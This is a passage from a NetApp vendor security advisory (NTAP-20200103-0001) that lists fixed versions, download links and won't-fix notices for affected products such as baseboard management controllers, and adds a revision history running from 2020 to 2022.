| **NetApp HCI Baseboard Management Controller (BMC) - H610S** | <https://mysupport.netapp.com/site/products/all/details/5d9f1108e01d9c0001ee51dd/downloads-tab/download/62542/Compute_Firmware_Bundle> <https://mysupport.netapp.com/site/products/all/details/element-software/downloads-tab/download/62654/Storage_Firmware_Bundle> First included in Compute Firmware Bundle version 2.27. |
| **NetApp Cloud Backup (formerly AltaVault)** | NetApp Cloud Backup (formerly AltaVault) has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2880179.html) for more information. |
| **FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400** | <https://mysupport.netapp.com/site/downloads/firmware/system-firmware-diagnostics> Fixed by bug 1289797. First fixed versions include the following: 13.3 |
| **NetApp SolidFire Baseboard Management Controller (BMC)** | NetApp SolidFire Baseboard Management Controller (BMC) has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2847476.html%20) for more information. |
| **NetApp SolidFire & HCI Management Node** | <https://mysupport.netapp.com/site/products/all/details/element-software/downloads-tab/download/62654/12.5> <https://mysupport.netapp.com/site/products/all/details/netapp-hci/downloads-tab/download/62542/1.10> |
| **NetApp Data Availability Services** | NetApp Data Availability Services has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2870808.html) for more information. |
| **NetApp SteelStore Cloud Integrated Storage** | NetApp SteelStore Cloud Integrated Storage has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2397079.html) for more information. |
| **Active IQ Unified Manager for VMware vSphere** | <https://mysupport.netapp.com/site/products/all/details/activeiq-unified-manager/downloads-tab/download/62791/9.7P1/downloads> <https://mysupport.netapp.com/site/products/all/details/activeiq-unified-manager/about-tab/download/62791/9.7P1> |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20200103-0001>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20200103 | Initial Public Release |
| 2.0 | 20200106 | Active IQ Unified Manager (formerly OnCommand Unified Manager) for VMware vSphere 9.5 and above moved to Affected Products |
| 3.0 | 20200127 | Cloud Volumes ONTAP Mediator moved to Products Not Affected |
| 4.0 | 20200205 | E-Series SANtricity OS Controller Baseboard Management Controller (BMC) - EF600A moved to Products Not Affected |
| 5.0 | 20200207 | AFF Baseboard Management Controller (BMC) - A700s moved to Affected Products |
| 6.0 | 20200211 | NetApp Data Availability Services moved to Affected Products |
| 7.0 | 20200219 | Element Software (formerly SolidFire Element OS), NetApp HCI Compute Nodes, NetApp HCI Storage Nodes moved to Products Not Affected and Element Software Management Node moved to Affected Products |
| 8.0 | 20200311 | NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H300E/H500E/H700E/H410S moved to Products Not Affected |
| 9.0 | 20200324 | FAS/AFF Baseboard Management Controller (BMC) and Service Processor moved to Products Not Affected |
| 10.0 | 20200423 | Host Utilities - SAN for Linux moved to Products Not Affected |
| 11.0 | 20200424 | Host Utilities - SAN for Unix moved to Products Not Affected |
| 12.0 | 20200504 | FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400 moved to Affected Products |
| 13.0 | 20200618 | Active IQ Unified Manager (formerly OnCommand Unified Manager) for VMware vSphere 9.5 and above added to Software Versions and Fixes |
| 14.0 | 20200724 | NetApp Data Availability Services moved to Won't Fix status |
| 15.0 | 20200901 | NetApp SteelStore Cloud Integrated Storage moved to Won't Fix status |
| 16.0 | 20201012 | NetApp HCI Baseboard Management Controller (BMC) - H610S added to Software Versions and Fixes |
| 17.0 | 20201112 | AFF Baseboard Management Controller (BMC) - A700s added to Software Versions and Fixes |
| 18.0 | 20210414 | Brocade Fabric Operating System Firmware moved to Affected Products |
| 19.0 | 20210421 | FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400 added to Software Versions and Fixes |
| 20.0 | 20211101 | NetApp SolidFire Baseboard Management Controller (BMC) moved to Won't Fix status |
| 21.0 | 20220106 | NetApp Cloud Backup (formerly AltaVault) moved to Won't Fix status |
| 22.0 | 20220527 | NetApp SolidFire & HCI Management Node added to Software Versions and Fixes |
| 23.0 | 20220609 | After additional review Brocade Fabric Operating System Firmware moved to Products Not Affected, Final status |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)


